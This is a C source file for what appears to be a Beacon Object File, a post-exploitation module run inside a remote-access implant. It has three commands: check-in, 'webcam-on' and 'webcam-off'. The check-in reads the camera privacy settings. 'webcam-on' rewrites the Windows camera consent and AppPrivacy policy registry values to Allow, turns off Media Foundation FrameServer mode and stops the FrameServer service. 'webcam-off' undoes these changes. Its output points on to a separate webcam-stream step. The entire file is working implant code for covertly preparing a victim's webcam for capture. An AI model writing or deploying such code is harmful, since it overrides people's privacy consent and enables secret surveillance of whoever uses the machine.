/* uvc-bof — webcam-checkin / webcam-on / webcam-off
 * op 0 = report privacy + FrameServer + KS UVC (what is missing)
 * op 1 = set Allow, FrameServerMode=0, stop FrameServer
 * op 2 = delete those values, start FrameServer (OS default)
 * Does not open the camera.
 */
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegCreateKeyExA(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegQueryValueExA(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegSetValueExA(HKEY, LPCSTR, DWORD, DWORD, const BYTE *, DWORD);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegDeleteValueA(HKEY, LPCSTR);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE, LPCSTR, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$QueryServiceStatus(SC_HANDLE, LPSERVICE_STATUS);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ControlService(SC_HANDLE, DWORD, LPSERVICE_STATUS);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE, DWORD, LPCSTR *);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);

DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT int WINAPI KERNEL32$lstrlenA(LPCSTR);
DECLSPEC_IMPORT int WINAPI KERNEL32$lstrcmpiA(LPCSTR, LPCSTR);
DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep(DWORD);

DECLSPEC_IMPORT char * __cdecl MSVCRT$strstr(const char *, const char *);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memset(void *, int, size_t);

#define HKCU ((HKEY)(ULONG_PTR)0x80000001u)
#define HKLM ((HKEY)(ULONG_PTR)0x80000002u)

#define P_WEBCAM   "Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam"
#define P_WEBCAM_NP P_WEBCAM "\\NonPackaged"
#define P_DEVACC   "Software\\Microsoft\\Windows\\CurrentVersion\\DeviceAccess\\Global\\{E5323777-F2AF-459B-A6C8-2F4DBC534314}"
#define P_PRIVPOL  "SOFTWARE\\Policies\\Microsoft\\Windows\\AppPrivacy"
#define P_MF       "SOFTWARE\\Microsoft\\Windows Media Foundation\\Platform"
#define P_MF32     "SOFTWARE\\WOW6432Node\\Microsoft\\Windows Media Foundation\\Platform"

static int g_miss;

static void say_ok(const char *k, const char *v)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %s = %s", k, v);
}

static void say_bad(const char *k, const char *have, const char *want)
{
    g_miss++;
    BeaconPrintf(CALLBACK_OUTPUT, "[-] %s = %s  (want %s)", k, have, want);
}

static int get_sz(HKEY root, const char *sub, const char *val, char *out, DWORD cap)
{
    HKEY k;
    DWORD type = 0, sz;
    LSTATUS st;

    if (cap == 0)
        return 0;
    out[0] = 0;
    sz = cap;
    st = ADVAPI32$RegOpenKeyExA(root, sub, 0, KEY_QUERY_VALUE, &k);
    if (st != ERROR_SUCCESS)
        return 0;
    st = ADVAPI32$RegQueryValueExA(k, val, NULL, &type, (LPBYTE)out, &sz);
    ADVAPI32$RegCloseKey(k);
    if (st != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ)) {
        out[0] = 0;
        return 0;
    }
    out[cap - 1] = 0;
    return 1;
}

static int get_dw(HKEY root, const char *sub, const char *val, DWORD *out)
{
    HKEY k;
    DWORD type = 0, sz = 4, v = 0;
    LSTATUS st;

    *out = 0xFFFFFFFFu;
    st = ADVAPI32$RegOpenKeyExA(root, sub, 0, KEY_QUERY_VALUE, &k);
    if (st != ERROR_SUCCESS)
        return 0;
    st = ADVAPI32$RegQueryValueExA(k, val, NULL, &type, (LPBYTE)&v, &sz);
    ADVAPI32$RegCloseKey(k);
    if (st != ERROR_SUCCESS || type != REG_DWORD)
        return 0;
    *out = v;
    return 1;
}

static int put_sz(HKEY root, const char *sub, const char *val, const char *data)
{
    HKEY k;
    DWORD disp = 0;
    LSTATUS st;

    st = ADVAPI32$RegCreateKeyExA(root, sub, 0, NULL, 0, KEY_SET_VALUE, NULL, &k, &disp);
    if (st != ERROR_SUCCESS)
        return 0;
    st = ADVAPI32$RegSetValueExA(k, val, 0, REG_SZ, (const BYTE *)data, (DWORD)KERNEL32$lstrlenA(data) + 1);
    ADVAPI32$RegCloseKey(k);
    return st == ERROR_SUCCESS;
}

static int put_dw(HKEY root, const char *sub, const char *val, DWORD data)
{
    HKEY k;
    DWORD disp = 0;
    LSTATUS st;

    st = ADVAPI32$RegCreateKeyExA(root, sub, 0, NULL, 0, KEY_SET_VALUE, NULL, &k, &disp);
    if (st != ERROR_SUCCESS)
        return 0;
    st = ADVAPI32$RegSetValueExA(k, val, 0, REG_DWORD, (const BYTE *)&data, 4);
    ADVAPI32$RegCloseKey(k);
    return st == ERROR_SUCCESS;
}

static int del_val(HKEY root, const char *sub, const char *val, const char *name)
{
    HKEY k;
    LSTATUS st;

    st = ADVAPI32$RegOpenKeyExA(root, sub, 0, KEY_SET_VALUE, &k);
    if (st != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s already absent", name);
        return 1;
    }
    st = ADVAPI32$RegDeleteValueA(k, val);
    ADVAPI32$RegCloseKey(k);
    if (st == ERROR_SUCCESS || st == 2 /* ERROR_FILE_NOT_FOUND */) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] deleted %s", name);
        return 1;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[-] delete %s failed %u", name, (unsigned)st);
    return 0;
}

static void check_sz(HKEY root, const char *sub, const char *val, const char *want, const char *name)
{
    char buf[64];

    if (!get_sz(root, sub, val, buf, sizeof(buf))) {
        say_bad(name, "missing", want);
        return;
    }
    if (KERNEL32$lstrcmpiA(buf, want) == 0)
        say_ok(name, buf);
    else
        say_bad(name, buf, want);
}

static void check_dw0(HKEY root, const char *sub, const char *val, const char *name)
{
    DWORD v;

    if (!get_dw(root, sub, val, &v)) {
        say_bad(name, "missing", "0");
        return;
    }
    if (v == 0)
        say_ok(name, "0");
    else {
        char tmp[16];
        tmp[0] = '0' + (char)((v / 10) % 10);
        /* small decimal — FrameServerMode is 0/1 */
        if (v < 10) {
            tmp[0] = (char)('0' + (int)v);
            tmp[1] = 0;
        } else {
            tmp[0] = '?';
            tmp[1] = 0;
        }
        say_bad(name, tmp, "0");
    }
}

static DWORD frameserver_state(void)
{
    SC_HANDLE scm, svc;
    SERVICE_STATUS ss;
    DWORD st = 0;

    MSVCRT$memset(&ss, 0, sizeof(ss));
    scm = ADVAPI32$OpenSCManagerA(NULL, NULL, 1 /* SC_MANAGER_CONNECT */);
    if (!scm)
        return 0;
    svc = ADVAPI32$OpenServiceA(scm, "FrameServer", 4 /* SERVICE_QUERY_STATUS */);
    if (!svc) {
        ADVAPI32$CloseServiceHandle(scm);
        return 0;
    }
    if (ADVAPI32$QueryServiceStatus(svc, &ss))
        st = ss.dwCurrentState;
    ADVAPI32$CloseServiceHandle(svc);
    ADVAPI32$CloseServiceHandle(scm);
    return st;
}

static int stop_frameserver(void)
{
    SC_HANDLE scm, svc;
    SERVICE_STATUS ss;
    int ok = 0;

    MSVCRT$memset(&ss, 0, sizeof(ss));
    scm = ADVAPI32$OpenSCManagerA(NULL, NULL, 1);
    if (!scm) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] OpenSCManager failed");
        return 0;
    }
    svc = ADVAPI32$OpenServiceA(scm, "FrameServer", 4 | 0x20 /* QUERY|STOP */);
    if (!svc) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] FrameServer service = absent");
        ADVAPI32$CloseServiceHandle(scm);
        return 1;
    }
    if (ADVAPI32$QueryServiceStatus(svc, &ss) && ss.dwCurrentState == 1) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] FrameServer already STOPPED");
        ok = 1;
    } else if (ADVAPI32$ControlService(svc, 1 /* STOP */, &ss)) {
        KERNEL32$Sleep(400);
        ADVAPI32$QueryServiceStatus(svc, &ss);
        if (ss.dwCurrentState == 1) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] FrameServer STOPPED");
            ok = 1;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] FrameServer state=%u after stop", ss.dwCurrentState);
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] FrameServer ControlService stop failed");
    }
    ADVAPI32$CloseServiceHandle(svc);
    ADVAPI32$CloseServiceHandle(scm);
    return ok;
}

static int start_frameserver(void)
{
    SC_HANDLE scm, svc;
    SERVICE_STATUS ss;
    int ok = 0;

    MSVCRT$memset(&ss, 0, sizeof(ss));
    scm = ADVAPI32$OpenSCManagerA(NULL, NULL, 1);
    if (!scm) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] OpenSCManager failed");
        return 0;
    }
    svc = ADVAPI32$OpenServiceA(scm, "FrameServer", 4 | 0x10 /* QUERY|START */);
    if (!svc) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] FrameServer service = absent");
        ADVAPI32$CloseServiceHandle(scm);
        return 1;
    }
    if (ADVAPI32$QueryServiceStatus(svc, &ss) && ss.dwCurrentState == 4) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] FrameServer already RUNNING");
        ok = 1;
    } else if (ADVAPI32$StartServiceA(svc, 0, NULL)) {
        KERNEL32$Sleep(500);
        ADVAPI32$QueryServiceStatus(svc, &ss);
        if (ss.dwCurrentState == 4 || ss.dwCurrentState == 2) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] FrameServer started (state=%u)", ss.dwCurrentState);
            ok = 1;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] FrameServer state=%u after start", ss.dwCurrentState);
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] FrameServer StartService failed");
    }
    ADVAPI32$CloseServiceHandle(svc);
    ADVAPI32$CloseServiceHandle(scm);
    return ok;
}

static int ks_uvc_present(void)
{
    typedef HANDLE (WINAPI *PFN_GetClass)(const GUID *, LPCSTR, HWND, DWORD);
    typedef BOOL (WINAPI *PFN_EnumIf)(HANDLE, VOID *, const GUID *, DWORD, VOID *);
    typedef BOOL (WINAPI *PFN_Detail)(HANDLE, VOID *, VOID *, DWORD, DWORD *, VOID *);
    typedef BOOL (WINAPI *PFN_Destroy)(HANDLE);
    typedef struct {
        DWORD cbSize;
        GUID InterfaceClassGuid;
        DWORD Flags;
        ULONG_PTR Reserved;
    } IFDATA;
    typedef struct {
        DWORD cbSize;
        CHAR DevicePath[1];
    } DETAIL;
    static const GUID kscat_video = { 0x6994AD05, 0x93EF, 0x11D0, { 0xA3, 0xCC, 0x00, 0xA0, 0xC9, 0x22, 0x31, 0x96 } };
    static const GUID kscat_capture = { 0x65E8773D, 0x8F56, 0x11D0, { 0xA3, 0xB9, 0x00, 0xA0, 0xC9, 0x22, 0x31, 0x96 } };
    const GUID *cats[2];
    HMODULE h;
    PFN_GetClass pGet;
    PFN_EnumIf pEnum;
    PFN_Detail pDet;
    PFN_Destroy pDes;
    HANDLE heap;
    int found = 0;
    int c;

    h = KERNEL32$LoadLibraryA("setupapi.dll");
    if (!h)
        return -1;
    pGet = (PFN_GetClass)KERNEL32$GetProcAddress(h, "SetupDiGetClassDevsA");
    pEnum = (PFN_EnumIf)KERNEL32$GetProcAddress(h, "SetupDiEnumDeviceInterfaces");
    pDet = (PFN_Detail)KERNEL32$GetProcAddress(h, "SetupDiGetDeviceInterfaceDetailA");
    pDes = (PFN_Destroy)KERNEL32$GetProcAddress(h, "SetupDiDestroyDeviceInfoList");
    if (!pGet || !pEnum || !pDet || !pDes)
        return -1;

    heap = KERNEL32$GetProcessHeap();
    cats[0] = &kscat_video;
    cats[1] = &kscat_capture;
    for (c = 0; c < 2 && !found; c++) {
        HANDLE hdev;
        DWORD i;
        hdev = pGet(cats[c], NULL, NULL, 0x00000002 | 0x00000010);
        if (!hdev || hdev == INVALID_HANDLE_VALUE)
            continue;
        for (i = 0; i < 32; i++) {
            IFDATA ifd;
            DWORD need = 0;
            DETAIL *det;
            char *path;

            MSVCRT$memset(&ifd, 0, sizeof(ifd));
            ifd.cbSize = sizeof(ifd);
            if (!pEnum(hdev, NULL, cats[c], i, &ifd))
                break;
            pDet(hdev, &ifd, NULL, 0, &need, NULL);
            if (need < 8)
                continue;
            det = (DETAIL *)KERNEL32$HeapAlloc(heap, 8, (SIZE_T)need + 8);
            if (!det)
                continue;
            MSVCRT$memset(det, 0, (SIZE_T)need + 8);
#ifdef _WIN64
            det->cbSize = 8;
#else
            det->cbSize = 5;
#endif
            if (!pDet(hdev, &ifd, det, need, &need, NULL)) {
                KERNEL32$HeapFree(heap, 0, det);
                continue;
            }
            path = det->DevicePath;
            if (MSVCRT$strstr(path, "hdaudio") || MSVCRT$strstr(path, "vid_0951") ||
                MSVCRT$strstr(path, "mi_02") || MSVCRT$strstr(path, "mi_01")) {
                KERNEL32$HeapFree(heap, 0, det);
                continue;
            }
            if (MSVCRT$strstr(path, "usb#") || MSVCRT$strstr(path, "usb\\")) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] ks uvc = %s", path);
                found = 1;
                KERNEL32$HeapFree(heap, 0, det);
                break;
            }
            KERNEL32$HeapFree(heap, 0, det);
        }
        pDes(hdev);
    }
    return found;
}

static void checkin(void)
{
    DWORD st;
    int ks;

    g_miss = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] webcam-checkin");

    check_sz(HKCU, P_WEBCAM, "Value", "Allow", "hkcu webcam");
    check_sz(HKCU, P_WEBCAM_NP, "Value", "Allow", "hkcu NonPackaged");
    check_sz(HKLM, P_WEBCAM, "Value", "Allow", "hklm webcam");
    check_sz(HKLM, P_WEBCAM_NP, "Value", "Allow", "hklm NonPackaged");
    check_sz(HKCU, P_DEVACC, "Value", "Allow", "hkcu DeviceAccess");
    check_dw0(HKLM, P_MF, "EnableFrameServerMode", "FrameServerMode");
    check_dw0(HKLM, P_MF, "EnableFrameServerModeWin32", "FrameServerModeWin32");
    check_dw0(HKLM, P_MF32, "EnableFrameServerMode", "FrameServerMode wow64");

    st = frameserver_state();
    if (st == 0)
        say_ok("FrameServer svc", "absent");
    else if (st == 1)
        say_ok("FrameServer svc", "STOPPED");
    else {
        char buf[8];
        buf[0] = 'R'; buf[1] = 'U'; buf[2] = 'N'; buf[3] = 0;
        if (st != 4)
            say_bad("FrameServer svc", "not-stopped", "STOPPED");
        else
            say_bad("FrameServer svc", "RUNNING", "STOPPED");
        (void)buf;
    }

    ks = ks_uvc_present();
    if (ks == 1)
        ;
    else if (ks == 0)
        say_bad("ks uvc", "absent/phantom", "USB Camera present");
    else
        say_bad("ks uvc", "setupapi fail", "USB Camera present");

    if (g_miss == 0)
        BeaconPrintf(CALLBACK_OUTPUT, "[+] webcam-checkin ready — webcam-stream");
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[-] webcam-checkin missing=%d  — webcam-on", g_miss);
}

static void turn_on(void)
{
    int n = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] webcam-on");
    if (!put_sz(HKCU, P_WEBCAM, "Value", "Allow")) n++;
    else BeaconPrintf(CALLBACK_OUTPUT, "[+] set hkcu webcam Allow");
    if (!put_sz(HKCU, P_WEBCAM_NP, "Value", "Allow")) n++;
    else BeaconPrintf(CALLBACK_OUTPUT, "[+] set hkcu NonPackaged Allow");
    if (!put_sz(HKLM, P_WEBCAM, "Value", "Allow"))
        BeaconPrintf(CALLBACK_OUTPUT, "[-] set hklm webcam failed (need admin)");
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[+] set hklm webcam Allow");
    if (!put_sz(HKLM, P_WEBCAM_NP, "Value", "Allow"))
        BeaconPrintf(CALLBACK_OUTPUT, "[-] set hklm NonPackaged failed");
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[+] set hklm NonPackaged Allow");
    if (!put_sz(HKCU, P_DEVACC, "Value", "Allow")) n++;
    else BeaconPrintf(CALLBACK_OUTPUT, "[+] set DeviceAccess Allow");
    put_dw(HKLM, P_PRIVPOL, "LetAppsAccessCamera", 1);

    if (!put_dw(HKLM, P_MF, "EnableFrameServerMode", 0))
        BeaconPrintf(CALLBACK_OUTPUT, "[-] set FrameServerMode failed");
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[+] FrameServerMode=0");
    if (!put_dw(HKLM, P_MF, "EnableFrameServerModeWin32", 0))
        BeaconPrintf(CALLBACK_OUTPUT, "[-] set FrameServerModeWin32 failed");
    else
        BeaconPrintf(CALLBACK_OUTPUT, "[+] FrameServerModeWin32=0");
    put_dw(HKLM, P_MF32, "EnableFrameServerMode", 0);
    put_dw(HKLM, P_MF32, "EnableFrameServerModeWin32", 0);

    stop_frameserver();
    (void)n;
    checkin();
}

static void turn_off(void)
{
    BeaconPrintf(CALLBACK_OUTPUT, "[*] webcam-off  (revert prep, start FrameServer)");
    del_val(HKCU, P_WEBCAM, "Value", "hkcu webcam");
    del_val(HKCU, P_WEBCAM_NP, "Value", "hkcu NonPackaged");
    del_val(HKLM, P_WEBCAM, "Value", "hklm webcam");
    del_val(HKLM, P_WEBCAM_NP, "Value", "hklm NonPackaged");
    del_val(HKCU, P_DEVACC, "Value", "hkcu DeviceAccess");
    del_val(HKLM, P_PRIVPOL, "LetAppsAccessCamera", "LetAppsAccessCamera");
    del_val(HKLM, P_MF, "EnableFrameServerMode", "FrameServerMode");
    del_val(HKLM, P_MF, "EnableFrameServerModeWin32", "FrameServerModeWin32");
    del_val(HKLM, P_MF32, "EnableFrameServerMode", "FrameServerMode wow64");
    del_val(HKLM, P_MF32, "EnableFrameServerModeWin32", "FrameServerModeWin32 wow64");
    start_frameserver();
    BeaconPrintf(CALLBACK_OUTPUT, "[*] webcam-off done — stream prep undone");
}

void go(char *args, int len)
{
    datap parser;
    int op = 0;

    BeaconDataParse(&parser, args, len);
    if (BeaconDataLength(&parser) >= 4)
        op = BeaconDataInt(&parser);
    if (op == 1)
        turn_on();
    else if (op == 2)
        turn_off();
    else
        checkin();
}
